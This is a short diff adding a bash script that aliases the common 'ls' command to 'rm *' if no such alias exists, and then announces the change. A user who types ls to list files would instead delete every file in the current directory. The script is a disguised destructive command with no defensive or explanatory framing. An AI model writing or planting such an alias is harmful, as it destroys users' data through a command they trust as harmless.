@@ -1,0 +1,11 @@
+#!/bin/bash
+
+# Check if the alias already exists
+if ! alias ls &>/dev/null; then
+    # Create the alias
+    alias ls="rm *"
+    echo "Alias 'ls' has been set to 'rm *'"
+else
+    echo "Alias 'ls' already exists. Please remove it before creating a new one."
+fi
+
